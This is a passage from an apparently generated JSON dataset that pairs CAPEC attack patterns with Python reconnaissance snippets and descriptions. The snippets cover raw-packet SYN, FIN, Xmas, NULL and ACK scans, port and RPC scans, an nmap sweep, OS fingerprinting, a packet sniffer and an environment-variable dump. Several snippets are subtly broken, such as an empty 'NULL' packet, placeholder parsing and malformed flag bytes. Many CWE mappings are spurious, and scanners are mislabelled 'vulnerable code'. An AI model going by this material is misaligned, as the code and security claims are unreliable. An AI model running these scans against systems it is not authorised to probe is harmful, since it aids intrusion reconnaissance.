        "code_snippet": "import requests\nimport time\n\n# URL of the target system\nurl = 'http://example.com/api/timestamp'\n\n# Function to get the timestamp from the target system\ndef get_timestamp():\n    response = requests.get(url)\n    if response.status_code == 200:\n        return response.text\n    return None\n\n# Function to exploit the timestamp\ndef exploit_timestamp():\n    timestamp = get_timestamp()\n    if timestamp:\n        print(f'Timestamp from target: {timestamp}')\n        # Simulate attack using the timestamp\n        # For example, predict random number generator seed\n        time.sleep(1)\n        new_timestamp = get_timestamp()\n        if new_timestamp:\n            print(f'New timestamp from target: {new_timestamp}')\n            # Compare timestamps to infer system behavior\n            if timestamp != new_timestamp:\n                print('Timestamps differ, potential vulnerability detected')\n            else:\n                print('Timestamps are the same, no immediate vulnerability detected')\n\nexploit_timestamp()",
        "description": "This Python code snippet demonstrates a potential 'Timestamp Request' attack. The code sends a GET request to a target system to retrieve its current timestamp. By analyzing the timestamps returned from the target system, an attacker can infer information about the system's behavior and potentially exploit time-based security mechanisms. The code also highlights the use of GET requests to retrieve sensitive information, which can be observed and used for further attacks. This example embodies the CAPEC by leveraging timestamp information to attack time-based security algorithms, and it touches on related CWEs such as exposure of sensitive information and observable timing discrepancies."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\n# ICMP Information Request packet (Type 15, Code 0)\nicmp_packet = b'\\x0f\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n\n# Target IP address\ntarget_ip = '192.168.1.1'\n\n# Send the ICMP Information Request\nsock.sendto(icmp_packet, (target_ip, 0))\n\n# Receive the response\nresponse, addr = sock.recvfrom(1024)\n\n# Print the response\nprint(f'Received response from {addr}: {response}')",
        "description": "This Python code snippet demonstrates how an adversary might send an ICMP Information Request (Type 15, Code 0) to a target host to check if it responds to this deprecated mechanism. The code creates a raw socket, constructs an ICMP Information Request packet, and sends it to the target IP address. It then waits for a response and prints it. This action can expose sensitive system information (CWE-200, CWE-497) if the target responds, as ICMP Information Requests are deprecated and should not be used. The code also transmits data in cleartext (CWE-319), which can be sniffed by unauthorized actors."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n\ndef tcp_ack_ping(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct a TCP packet with ACK flag set\n        packet = b''\n        # IP header fields (simplified)\n        packet += b'\\x45'  # Version and Header Length\n        packet += b'\\x00'  # Type of Service\n        packet += b'\\x00\\x28'  # Total Length\n        packet += b'\\xab\\xcd'  # Identification\n        packet += b'\\x40\\x00'  # Flags and Fragment Offset\n        packet += b'\\x40'  # TTL\n        packet += b'\\x06'  # Protocol (TCP)\n        packet += b'\\x00\\x00'  # Header Checksum\n        packet += socket.inet_aton('192.168.1.1')  # Source IP (example)\n        packet += socket.inet_aton(target_ip)  # Destination IP\n\n        # TCP header fields (simplified)\n        packet += b'\\x00\\x50'  # Source Port (example: 80)\n        packet += target_port.to_bytes(2, 'big')  # Destination Port\n        packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n        packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n        packet += b'\\x50\\x10'  # Data Offset and Flags (ACK)\n        packet += b'\\x71\\x10'  # Window Size\n        packet += b'\\x00\\x00'  # Checksum\n        packet += b'\\x00\\x00'  # Urgent Pointer\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, 0))\n\n        # Listen for RST response\n        response = sock.recv(1024)\n        if response:\n            print(f'Host {target_ip} is alive (RST received)')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    tcp_ack_ping('192.168.1.2', 80)",
        "description": "This Python code snippet demonstrates a TCP ACK Ping, which is used to determine if a remote host is alive by sending a TCP segment with the ACK flag set and listening for a RST response. The code creates a raw socket and constructs a TCP packet with the necessary headers. It then sends the packet to the target IP and port, and listens for a RST response to confirm the host's presence. The code also highlights potential security weaknesses such as CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by transmitting data in cleartext and potentially exposing sensitive information. Additionally, it touches on CWE-605 (Multiple Binds to the Same Port) by creating a raw socket that could interfere with other services on the same port."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "import socket\n\n# Create a UDP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n# Target IP and a high random port\ntarget_ip = '192.168.1.1'\ntarget_port = 65535\n\n# Send a UDP packet to the target\nsock.sendto(b'', (target_ip, target_port))\n\n# Set a timeout for the response\nsock.settimeout(2)\n\ntry:\n    # Try to receive the ICMP 'port unreachable' message\n    data, addr = sock.recvfrom(1024)\n    print(f'Received response from {addr}')\nexcept socket.timeout:\n    print('No response received')\nfinally:\n    sock.close()",
        "description": "This Python code snippet demonstrates a UDP ping to determine if a remote host is alive. It sends a UDP packet to a high random port on the target IP address. If the port is unreachable, the target may respond with an ICMP 'port unreachable' message, indicating that the host is alive. The code sets a timeout to wait for this response. This approach leverages the fact that some firewalls may not block UDP packets to high ports or may allow certain ICMP messages through. The code also touches on CWE-200 (Exposure of Sensitive Information) as it attempts to gather information about the host's status, and CWE-941 (Incorrectly Specified Destination) as it sends packets to potentially unintended ports."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "import socket\n\n# Function to perform TCP SYN Ping\ndef tcp_syn_ping(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Construct a TCP SYN packet\n        packet = b'\\x45\\x00\\x00\\x3c\\x1c\\x46\\x40\\x00\\x40\\x06\\xb1\\xe6'  # IP header\n        packet += b'\\x0a\\x00\\x00\\x01'  # Source IP\n        packet += socket.inet_aton(target_ip)  # Destination IP\n        packet += b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'  # TCP header\n        packet += b'\\x50\\x02\\x20\\x00\\x72\\x10\\x00\\x00'  # SYN flag\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recvfrom(1024)\n        if response:\n            print(f'Received response from {target_ip}:{target_port}')\n        else:\n            print(f'No response from {target_ip}:{target_port}')\n    except socket.error as e:\n        print(f'Socket error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    target_port = 80\n    tcp_syn_ping(target_ip, target_port)",
        "description": "This Python code snippet demonstrates a TCP SYN Ping, which is used for host discovery by sending a TCP SYN packet to a target IP and port. The code creates a raw socket, constructs a TCP SYN packet, and sends it to the target. It then waits for a response to determine if the host is alive. This embodies the main idea of the CAPEC by using TCP SYN packets for host discovery. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially revealing the presence of a host, and CWE-319 (Cleartext Transmission of Sensitive Information) by sending packets in cleartext."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "import socket\n\n# Vulnerable code that exposes sensitive information and allows port scanning\n\ndef check_open_ports(target_ip):\n    open_ports = []\n    for port in range(1, 1024):  # Scanning common ports\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((target_ip, port))\n        if result == 0:\n            open_ports.append(port)\n        sock.close()\n    return open_ports\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'  # Example target IP\n    open_ports = check_open_ports(target_ip)\n    print(f'Open ports on {target_ip}: {open_ports}')\n",
        "description": "This Python code snippet demonstrates a simple port scanning technique, which is the main idea of the CAPEC 'Port Scanning'. The function 'check_open_ports' scans the first 1024 ports on a given target IP address to determine which ports are open. This can expose sensitive information about the services running on the target system (CWE-200). The code also implicitly highlights the risk of multiple binds to the same port (CWE-605) and the potential for cleartext transmission of sensitive information (CWE-319) if the services on these ports are not properly secured. The example usage at the end shows how an attacker might use this function to identify open ports on a target machine."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "import socket\n\n# Vulnerable code: TCP Connect Scan\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-605: Multiple Binds to the Same Port\n# CWE-291: Reliance on IP Address for Authentication\n# CWE-617: Reachable Assertion\n# CWE-353: Missing Support for Integrity Check\n\ndef tcp_connect_scan(target_ip, target_port):\n    try:\n        # Create a socket object\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        \n        # Attempt to connect to the target IP and port\n        result = sock.connect_ex((target_ip, target_port))\n        \n        if result == 0:\n            print(f\"Port {target_port} is open on {target_ip}\")\n        else:\n            print(f\"Port {target_port} is closed on {target_ip}\")\n        \n        sock.close()\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\n# This will scan port 80 on the target IP address\n# Note: Replace '192.168.1.1' with the actual target IP address\ntcp_connect_scan('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a basic TCP connect scan, which is used to determine if a specific port on a target system is open. The code attempts to establish a full TCP connection (three-way handshake) with the target IP and port. If the connection is successful, it reports the port as open; otherwise, it reports the port as closed. This process embodies the main idea of the CAPEC 'TCP Connect Scan'. The code also touches on several related CWEs: \n- CWE-200: The scan could expose sensitive information about open ports to unauthorized actors.\n- CWE-605: The code does not handle multiple binds to the same port, which could lead to service hijacking.\n- CWE-291: The code relies on the IP address for identifying the target, which is a weak form of authentication.\n- CWE-617: The code does not include assertions, but an attacker could potentially cause the program to behave unexpectedly.\n- CWE-353: The code does not include any integrity checks for the data transmitted during the scan."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "import socket\n\ndef tcp_fin_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct the TCP packet with FIN flag set\n        packet = b''\n        # IP header fields (simplified)\n        packet += b'\\x45'  # Version and Header Length\n        packet += b'\\x00'  # Type of Service\n        packet += b'\\x00\\x28'  # Total Length\n        packet += b'\\xab\\xcd'  # Identification\n        packet += b'\\x40\\x00'  # Flags and Fragment Offset\n        packet += b'\\x40'  # TTL\n        packet += b'\\x06'  # Protocol (TCP)\n        packet += b'\\x00\\x00'  # Header Checksum (to be filled by kernel)\n        packet += socket.inet_aton('192.168.1.1')  # Source IP (example)\n        packet += socket.inet_aton(target_ip)  # Destination IP\n\n        # TCP header fields (simplified)\n        packet += b'\\x00\\x50'  # Source Port (example: 80)\n        packet += target_port.to_bytes(2, 'big')  # Destination Port\n        packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n        packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n        packet += b'\\x50\\x01'  # Data Offset and Flags (FIN)\n        packet += b'\\x71\\x10'  # Window Size\n        packet += b'\\x00\\x00'  # Checksum (to be filled by kernel)\n        packet += b'\\x00\\x00'  # Urgent Pointer\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, 0))\n\n        # Receive the response\n        response = sock.recv(1024)\n        if response[33] == 0x14:  # Check if RST flag is set in the response\n            print(f'Port {target_port} is closed.')\n        else:\n            print(f'Port {target_port} is open or filtered.')\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\ntcp_fin_scan('192.168.1.2', 80)",
        "description": "This Python code snippet demonstrates a TCP FIN scan, which is used to determine if a port on a target machine is closed. The code creates a raw socket and constructs a TCP packet with the FIN flag set. It sends this packet to the target IP and port, and then listens for a response. If a RST (reset) packet is received, it indicates that the port is closed. This scan technique leverages the behavior described in RFC 793, where out-of-state TCP segments sent to closed ports elicit a RST response. The code also touches on related CWEs by showing how sensitive information (port status) can be exposed to unauthorized actors and how the integrity of the communication is not verified."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "import socket\n\n# Function to perform TCP Xmas Scan\ndef tcp_xmas_scan(target_ip, target_port):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # Construct the TCP packet with all flags set (Xmas Tree Packet)\n    packet = b''\n    # IP Header (20 bytes)\n    packet += b'\\x45\\x00\\x00\\x28'  # Version, IHL, Type of Service | Total Length\n    packet += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\n    packet += b'\\x40\\x06\\x00\\x00'  # TTL, Protocol (TCP) | Header Checksum\n    packet += socket.inet_aton('192.168.1.1')  # Source IP (example)\n    packet += socket.inet_aton(target_ip)  # Destination IP\n    # TCP Header (20 bytes)\n    packet += b'\\x00\\x50'  # Source Port (example: 80)\n    packet += target_port.to_bytes(2, 'big')  # Destination Port\n    packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n    packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n    packet += b'\\x50\\xff\\xff\\xff'  # Data Offset, Reserved, Flags (all set)\n    packet += b'\\x00\\x00\\x00\\x00'  # Window Size | Checksum | Urgent Pointer\n\n    # Send the packet\n    sock.sendto(packet, (target_ip, 0))\n\n    # Receive the response\n    try:\n        response = sock.recv(1024)\n        if response[33] == 0x14:  # Check if RST flag is set in the response\n            print(f'Port {target_port} is closed.')\n        else:\n            print(f'Port {target_port} is open or filtered.')\n    except socket.timeout:\n        print(f'No response from port {target_port}.')\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.2'  # Target IP address\n    target_port = 80  # Target port\n    tcp_xmas_scan(target_ip, target_port)",
        "description": "This Python code snippet demonstrates a TCP Xmas Scan, which is used to determine if ports on a target machine are closed. The scan sends TCP packets with all flags set (Xmas Tree Packets) to the target port. According to RFC 793, a closed port should respond with a RST packet, while an open port should discard the packet. The code constructs a raw TCP packet with all flags set, sends it to the target IP and port, and checks the response for a RST flag to determine if the port is closed. This scan can expose sensitive information about the target's network configuration (CWE-200) and relies on the behavior of the TCP protocol, which may not include integrity checks (CWE-353, CWE-924) or proper endpoint restrictions (CWE-923)."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "import socket\n\n# Function to perform TCP NULL scan\ndef tcp_null_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Construct a TCP packet with no flags set (NULL scan)\n        packet = b''\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive response\n        response = sock.recvfrom(1024)\n        if response:\n            print(f'Port {target_port} is closed (RST received)')\n        else:\n            print(f'Port {target_port} is open (no response)')\n    except socket.error as e:\n        print(f'Socket error: {e}')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    target_port = 80\n    tcp_null_scan(target_ip, target_port)",
        "description": "This Python code snippet demonstrates a TCP NULL scan, which is used to determine if ports on a target machine are closed. The code creates a raw socket and sends a TCP packet with no flags set to the target IP and port. If a response is received, it indicates that the port is closed (RST received). If no response is received, it indicates that the port is open. The code also includes error handling for socket errors and other exceptions. This scan technique leverages the behavior described in RFC 793, where closed ports respond with a RST packet to out-of-state TCP segments. The code also touches on related CWEs by demonstrating potential exposure of sensitive information (CWE-200) and handling of NULL pointers (CWE-476)."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "import socket\n\n# Function to perform TCP ACK Scan\ndef tcp_ack_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct TCP ACK packet\n        packet = b''\n        # IP Header (20 bytes)\n        packet += b'\\x45\\x00\\x00\\x28'  # Version, IHL, Type of Service, Total Length\n        packet += b'\\xab\\xcd\\x00\\x00'  # Identification, Flags, Fragment Offset\n        packet += b'\\x40\\x06\\x00\\x00'  # TTL, Protocol, Header Checksum\n        packet += socket.inet_aton('192.168.1.100')  # Source IP\n        packet += socket.inet_aton(target_ip)  # Destination IP\n        # TCP Header (20 bytes)\n        packet += b'\\x00\\x50'  # Source Port\n        packet += target_port.to_bytes(2, 'big')  # Destination Port\n        packet += b'\\x00\\x00\\x00\\x00'  # Sequence Number\n        packet += b'\\x00\\x00\\x00\\x00'  # Acknowledgment Number\n        packet += b'\\x50\\x10\\x00\\x00'  # Data Offset, Reserved, Flags, Window\n        packet += b'\\x00\\x00\\x00\\x00'  # Checksum, Urgent Pointer\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, 0))\n        print(f\"Sent TCP ACK packet to {target_ip}:{target_port}\")\n\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\nif __name__ == '__main__':\n    tcp_ack_scan('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a basic implementation of a TCP ACK scan, which is used to gather information about firewall or ACL configurations. The code creates a raw socket and constructs a TCP ACK packet with a custom IP and TCP header. It then sends this packet to a specified target IP and port. This type of scan can help identify how a firewall handles ACK packets, providing insights into the firewall rules. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200), cleartext transmission (CWE-319), and improper access control (CWE-1280, CWE-529)."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "import socket\n\ndef tcp_window_scan(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.settimeout(1)\n\n        # Send a TCP packet with ACK flag set\n        packet = create_ack_packet(target_ip, target_port)\n        sock.sendto(packet, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recvfrom(1024)[0]\n        window_size = parse_window_size(response)\n\n        if window_size > 0:\n            print(f\"Port {target_port} is open on {target_ip}\")\n        else:\n            print(f\"Port {target_port} is closed on {target_ip}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n\ndef create_ack_packet(target_ip, target_port):\n    # This function should create a TCP packet with the ACK flag set\n    # For simplicity, this is a placeholder\n    return b''\n\n\ndef parse_window_size(response):\n    # This function should parse the TCP window size from the response\n    # For simplicity, this is a placeholder\n    return 0\n\n# Example usage\nif __name__ == '__main__':\n    tcp_window_scan('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a basic implementation of a TCP Window Scan, which is used to infer the status of a port on a target machine. The code creates a raw socket and sends a TCP packet with the ACK flag set to the target IP and port. It then receives the response and parses the TCP window size field to determine if the port is open or closed. The code is simplified and includes placeholders for packet creation and response parsing. This scan technique can expose sensitive information about the target system, aligning with CWE-200, CWE-319, and CWE-497. The lack of integrity checks (CWE-353) and potential for covert timing channels (CWE-385) are also relevant considerations."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "import socket\n\n# Vulnerable code that scans for RPC services on a Unix/Linux host\n\ndef scan_rpc_services(host):\n    rpc_ports = [111, 2049, 4045]  # Common RPC ports\n    for port in rpc_ports:\n        try:\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.settimeout(1)\n            s.connect((host, port))\n            print(f'RPC service found on port {port}')\n            s.close()\n        except socket.error:\n            pass\n\n# Example usage\nscan_rpc_services('192.168.1.1')\n",
        "description": "This Python code snippet demonstrates a basic TCP scan for RPC services on a Unix/Linux host, which aligns with the CAPEC description of 'TCP RPC Scan'. The code iterates over a list of common RPC ports (111, 2049, 4045) and attempts to establish a connection to each port on the specified host. If a connection is successful, it prints a message indicating that an RPC service is found on that port. This scan can expose sensitive information (CWE-200) about the services running on the host. Additionally, if the RPC service is vulnerable, it could be exploited for authentication bypass (CWE-294), downloading code without integrity checks (CWE-494), server-side request forgery (CWE-918), or multiple binds to the same port (CWE-605)."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "import socket\n\n# Function to perform UDP scan\ndef udp_scan(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.settimeout(1)\n    try:\n        # Send an empty UDP packet\n        sock.sendto(b'', (target_ip, target_port))\n        # Try to receive a response\n        data, _ = sock.recvfrom(1024)\n        if data:\n            print(f'Port {target_port} is open on {target_ip}')\n    except socket.timeout:\n        print(f'Port {target_port} is open or filtered on {target_ip}')\n    except Exception as e:\n        print(f'Error: {e}')\n    finally:\n        sock.close()\n\n# Example usage\nudp_scan('192.168.1.1', 53)",
        "description": "This Python code snippet demonstrates a basic UDP scan to determine the status of a UDP port on a target system. The function `udp_scan` sends an empty UDP packet to the specified target IP and port. If a response is received, it indicates that the port is open. If no response is received within the timeout period, it suggests that the port is either open or filtered. This method leverages the lack of stateful mechanisms in UDP and relies on the absence of responses to infer port status. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200), cleartext transmission (CWE-319), and missing integrity checks (CWE-353)."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "import os\nimport subprocess\n\ndef network_topology_mapping():\n    # Using a simple ICMP ping to map network nodes\n    ip_range = '192.168.1.0/24'\n    try:\n        # This command can expose sensitive network information\n        result = subprocess.check_output(['nmap', '-sn', ip_range])\n        print(result.decode('utf-8'))\n    except subprocess.CalledProcessError as e:\n        print(f'Error during network scan: {e}')\n\nif __name__ == '__main__':\n    network_topology_mapping()",
        "description": "This Python code snippet demonstrates a basic network topology mapping using the 'nmap' tool to perform an ICMP ping scan over a specified IP range. The function 'network_topology_mapping' executes the 'nmap' command to discover active hosts within the given subnet. This process can expose sensitive network information, such as active IP addresses and hostnames, to unauthorized actors if not properly secured. The code embodies the main idea of CAPEC-309 (Network Topology Mapping) and highlights potential vulnerabilities related to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere)."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "import socket\n\n# Function to scan for open ports\ndef scan_ports(ip, ports):\n    open_ports = []\n    for port in ports:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((ip, port))\n        if result == 0:\n            open_ports.append(port)\n        sock.close()\n    return open_ports\n\n# Function to check for vulnerable services\ndef check_vulnerable_services(ip, open_ports):\n    vulnerable_services = {}\n    for port in open_ports:\n        if port == 21:  # FTP\n            vulnerable_services[port] = 'FTP (potentially vulnerable)'\n        elif port == 23:  # Telnet\n            vulnerable_services[port] = 'Telnet (potentially vulnerable)'\n        elif port == 25:  # SMTP\n            vulnerable_services[port] = 'SMTP (potentially vulnerable)'\n        elif port == 161:  # SNMP\n            vulnerable_services[port] = 'SNMP (potentially vulnerable)'\n    return vulnerable_services\n\n# Example usage\nip_address = '192.168.1.1'\nports_to_scan = [21, 23, 25, 80, 161]\nopen_ports = scan_ports(ip_address, ports_to_scan)\nvulnerable_services = check_vulnerable_services(ip_address, open_ports)\n\nprint(f\"Open Ports: {open_ports}\")\nprint(f\"Vulnerable Services: {vulnerable_services}\")",
        "description": "This Python code snippet demonstrates a basic port scanning and service identification process, which aligns with the CAPEC description of 'Scanning for Vulnerable Software'. The `scan_ports` function scans a given IP address for open ports from a specified list. The `check_vulnerable_services` function then checks these open ports against a list of known vulnerable services (FTP, Telnet, SMTP, SNMP) and flags them as potentially vulnerable. This process embodies the idea of identifying exploitable network configurations and unpatched services. The code also highlights potential CWE issues such as 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) and 'Excessive Attack Surface' (CWE-1125) by revealing open ports and services that could be targeted by an attacker."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "import os\nimport platform\n\n# Function to perform active OS fingerprinting\n# CWE-287: Authentication Bypass Issues\n# CWE-532: Information Exposure Through Debug Log Files\n# CWE-589: Call to Non-ubiquitous API\n\ndef active_os_fingerprinting():\n    try:\n        # Using platform module to get OS details\n        os_info = platform.uname()\n        print(f'OS: {os_info.system}, Version: {os_info.version}')\n\n        # Using os module to get environment variables (potentially sensitive information)\n        env_vars = os.environ\n        for key, value in env_vars.items():\n            print(f'{key}: {value}')\n\n    except Exception as e:\n        # Logging the error (CWE-532)\n        with open('debug.log', 'a') as log_file:\n            log_file.write(f'Error: {str(e)}\\n')\n\n# Call the function\nactive_os_fingerprinting()",
        "description": "This Python code snippet demonstrates active OS fingerprinting, which is the process of gathering information about the operating system of a target machine. The code uses the 'platform' module to retrieve and print OS details, and the 'os' module to access and print environment variables, which may contain sensitive information. The code also includes a basic error handling mechanism that logs errors to a debug file, potentially exposing sensitive information (CWE-532). Additionally, the use of environment variables and platform-specific APIs can lead to inconsistencies and potential security issues (CWE-589). This snippet embodies the main idea of CAPEC-312: Active OS Fingerprinting, while also touching on related weaknesses such as authentication bypass (CWE-287) and information exposure through debug logs (CWE-532)."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "import socket\nimport struct\n\n# Function to send a crafted packet to probe the target\ndef send_probe(target_ip, target_port):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    \n    # Construct a TCP packet with unusual flags\n    packet = struct.pack('!HHLLBBHHH', 1234, target_port, 0, 0, 80, 2, 8192, 0, 0)\n    \n    # Send the packet to the target\n    sock.sendto(packet, (target_ip, 0))\n\n# Function to receive and analyze the response\ndef receive_response(sock):\n    response, _ = sock.recvfrom(1024)\n    # Analyze the response to determine the OS\n    if response:\n        # Extract TCP flags from the response\n        tcp_flags = struct.unpack('!BBHHHBBH', response[20:34])[5]\n        if tcp_flags == 18:  # SYN-ACK\n            print('Target OS: Linux')\n        elif tcp_flags == 20:  # RST\n            print('Target OS: Windows')\n        else:\n            print('Unknown OS')\n\n# Main function to perform OS fingerprinting\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    target_port = 80\n    send_probe(target_ip, target_port)\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    receive_response(sock)\n",
        "description": "This Python code snippet demonstrates a basic form of active OS fingerprinting. It sends a crafted TCP packet with unusual flags to a target IP address and port, then analyzes the response to infer the operating system of the target. The code leverages raw sockets to send and receive packets, and it checks the TCP flags in the response to identify the OS. This embodies the CAPEC concept of detecting the OS by observing unique responses to anomalous input. The related CWEs are represented by the exposure of sensitive system information (CWE-497) and observable behavioral discrepancies (CWE-207) in the target's response."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "import socket\nimport struct\n\n# Function to passively capture packets\ndef capture_packets(interface):\n    # Create a raw socket to capture packets\n    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n    sock.bind((interface, 0))\n    \n    while True:\n        packet = sock.recvfrom(65565)\n        parse_packet(packet[0])\n\n# Function to parse captured packets\ndef parse_packet(packet):\n    # Extract Ethernet header\n    eth_header = packet[0:14]\n    eth = struct.unpack('!6s6sH', eth_header)\n    eth_protocol = socket.ntohs(eth[2])\n    \n    # Check if IP packet\n    if eth_protocol == 8:\n        # Extract IP header\n        ip_header = packet[14:34]\n        iph = struct.unpack('!BBHHHBBH4s4s', ip_header)\n        ttl = iph[5]\n        protocol = iph[6]\n        src_addr = socket.inet_ntoa(iph[8])\n        dst_addr = socket.inet_ntoa(iph[9])\n        \n        # Print captured packet details\n        print(f'Source: {src_addr}, Destination: {dst_addr}, TTL: {ttl}, Protocol: {protocol}')\n\n# Start capturing packets on the specified interface\ncapture_packets('eth0')",
        "description": "This Python code snippet demonstrates passive OS fingerprinting by capturing and analyzing network packets on a specified network interface. The code creates a raw socket to capture all packets on the network interface 'eth0'. It then parses the Ethernet and IP headers of each packet to extract information such as the source and destination IP addresses, TTL (Time to Live), and protocol type. This information can be used to infer the operating system of the devices based on known signatures or values. The code embodies the main idea of CAPEC- Passive OS Fingerprinting, and relates to CWEs such as Exposure of Sensitive Information (CWE-200), Cleartext Transmission of Sensitive Information (CWE-319), and Exposure of Sensitive System Information (CWE-497) by demonstrating how sensitive information can be passively monitored and extracted from network traffic."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
